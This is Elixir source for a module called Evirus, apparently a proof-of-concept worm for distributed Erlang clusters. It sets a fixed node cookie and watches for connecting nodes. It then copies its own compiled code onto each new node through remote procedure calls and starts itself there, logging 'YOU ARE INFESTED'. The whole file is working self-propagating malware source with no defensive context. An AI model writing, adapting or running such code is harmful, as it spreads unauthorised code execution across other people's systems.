defmodule Evirus do
  @moduledoc """
  Documentation for `Evirus`.
  """

  require Logger

  def start()  do
    :erlang.set_cookie(:"HELLO")
    start ( :code.get_object_code(__MODULE__) )
  end

  def start(beamcode) do
    spawn_process(beamcode)
  end

  def spawn_process(beamcode) do
    Logger.info "in spawn_process"
     case Process.whereis(:virus) do
       :nil ->
         Logger.info("spawning...")
         Process.spawn(fn -> virus(beamcode) end, [])
       pid ->
         Logger.info( "Virus code Already spawned #{inspect(pid)}")
     end
  end

  def virus(beamcode) do
    Logger.info("Registering name...")
    Process.register(self(), :virus)

    Logger.info("Logging all nodes.....")
    :net_kernel.monitor_nodes(:true, %{:connection_id => :true,
                                       :node_type => :all,
                                       :nodedown_reason => :true})

    Logger.info "YOU ARE INFESTED"
    virus_loop(beamcode)
  end

  def virus_loop(beamcode) do
    Logger.info("VIRUS LOOP")
    receive do
      connection ->
        infest(connection, beamcode)
      after 1000 ->
          :nil
    end
    virus_loop(beamcode)
  end

  def infest({:nodeup, node, _connection_details} = msg,
    {module, bin, file} = beam) do
    Logger.info("infesting...")
    _load_out = :rpc.call(node, :code, :load_binary, [module, file, bin])
    _call_out = :rpc.call(node, Evirus, :start, [] )
  end


  def infest(something, _beamcode) do
    Logger.info("Different message.. logging.. #{inspect(something)}.")
   end

end
